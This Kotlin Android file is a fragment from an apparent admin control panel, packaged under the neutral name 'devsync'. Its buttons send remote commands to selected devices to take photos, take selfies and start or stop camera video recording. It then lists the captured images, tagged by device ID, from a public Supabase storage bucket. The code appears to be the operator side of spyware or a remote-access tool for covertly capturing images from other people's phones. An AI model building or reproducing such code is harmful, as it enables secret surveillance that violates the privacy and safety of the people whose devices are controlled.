package com.example.devsync

  import android.os.Bundle
  import android.view.View
  import android.widget.Button
  import android.widget.TextView
  import androidx.fragment.app.Fragment
  import androidx.recyclerview.widget.LinearLayoutManager
  import androidx.recyclerview.widget.RecyclerView
  import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
  import kotlinx.coroutines.*

  class CameraFragment : Fragment(R.layout.fragment_camera) {

      private val admin get() = requireActivity() as AdminControlActivity
      private lateinit var rvPhotos: RecyclerView
      private lateinit var adapter: ScreenshotListAdapter
      private lateinit var tvVideoStatus: TextView
      private val photoList = mutableListOf<ScreenshotItem>()
      private var cameraVideoOn = false

      override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
          super.onViewCreated(view, savedInstanceState)

          rvPhotos = view.findViewById(R.id.rvPhotos)
          tvVideoStatus = view.findViewById(R.id.tvCameraVideoStatus)
          adapter = ScreenshotListAdapter(photoList)
          rvPhotos.layoutManager = LinearLayoutManager(requireContext())
          rvPhotos.adapter = adapter

          view.findViewById<Button>(R.id.btnTakePhoto).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_photo").setValue(true) }
          }

          view.findViewById<Button>(R.id.btnTakeSelfie).setOnClickListener {
              admin.sendToSelected { d -> d.child("take_selfie").setValue(true) }
          }

          view.findViewById<Button>(R.id.btnCameraVideo).setOnClickListener {
              cameraVideoOn = !cameraVideoOn
              admin.sendToSelected { d -> d.child("camera_video_flag").setValue(cameraVideoOn) }
              tvVideoStatus.text = if (cameraVideoOn) "● Video: Recording..." else "● Video: Stopped"
              tvVideoStatus.setTextColor(if (cameraVideoOn) 0xFFFF4444.toInt() else 0xFF8B949E.toInt())
              val btn = view.findViewById<Button>(R.id.btnCameraVideo)
              btn.text = if (cameraVideoOn) "⏹ Stop Video" else "🎥 Video"
              btn.backgroundTintList = android.content.res.ColorStateList.valueOf(
                  if (cameraVideoOn) android.graphics.Color.parseColor("#DA3633")
                  else android.graphics.Color.parseColor("#1F6FEB")
              )
          }

          view.findViewById<SwipeRefreshLayout>(R.id.swipeCamera).setOnRefreshListener {
              loadPhotos { view.findViewById<SwipeRefreshLayout>(R.id.swipeCamera).isRefreshing = false }
          }

          loadPhotos(null)
      }

      override fun onResume() {
          super.onResume()
          loadPhotos(null)
      }

      private fun loadPhotos(onDone: (() -> Unit)?) {
          CoroutineScope(Dispatchers.IO).launch {
              val arr = admin.supabaseList("photos")
              val list = mutableListOf<ScreenshotItem>()
              for (i in 0 until arr.length()) {
                  try {
                      val obj  = arr.getJSONObject(i)
                      val name = obj.optString("name")
                      if (!name.endsWith(".jpg") && !name.endsWith(".jpeg")) continue
                      val noExt = name.removeSuffix(".jpg").removeSuffix(".jpeg")
                      val lastUnder = noExt.lastIndexOf('_')
                      val ts  = if (lastUnder >= 0) noExt.substring(lastUnder + 1).toLongOrNull() ?: 0L else 0L
                      val did = if (lastUnder >= 0) noExt.substring(0, lastUnder) else noExt
                      val url = "${AdminControlActivity.SUPABASE_URL}/storage/v1/object/public/photos/$name"
                      list.add(ScreenshotItem(name, did, url, ts))
                  } catch (_: Exception) {}
              }
              list.sortByDescending { it.timestamp }
              withContext(Dispatchers.Main) {
                  photoList.clear(); photoList.addAll(list)
                  adapter.notifyDataSetChanged()
                  onDone?.invoke()
                  if (list.isEmpty()) {
                      admin.showStatus("📸 No camera photos yet", true)
                  }
              }
          }
      }
  }
  